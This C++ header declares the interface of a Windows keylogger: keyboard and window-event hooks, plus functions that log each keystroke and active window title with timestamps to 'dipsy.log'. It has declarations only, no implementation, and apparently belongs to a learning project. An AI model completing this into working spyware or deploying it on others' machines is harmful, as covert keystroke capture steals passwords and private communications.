#ifndef WINKEY_HPP
# define WINKEY_HPP

# define WIN32_LEAN_AND_MEAN
# define __STDC_WANT_SECURE_LIB__ 1

#include <iostream>
#include <fstream>
#include <chrono>
#include <windows.h>

# define LOG_FILE "dipsy.log"

extern HHOOK g_keyboard_hook;
extern HWINEVENTHOOK g_windows_hook;
extern std::ofstream g_log_file;

int open_log_file();
void log_keystroke(std::string key_name);
void log_window_title(std::string window_title);
std::string get_current_timestamp();

int install_keyboard_hook();
int install_windows_hook();

LRESULT CALLBACK keyboard_hook(
    _In_ int    nCode,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
);

void CALLBACK windows_hook(
    HWINEVENTHOOK hWinEventHook,
    DWORD event,
    HWND hwnd,
    LONG idObject,
    LONG idChild,
    DWORD idEventThread,
    DWORD dwmsEventTime
);

#endif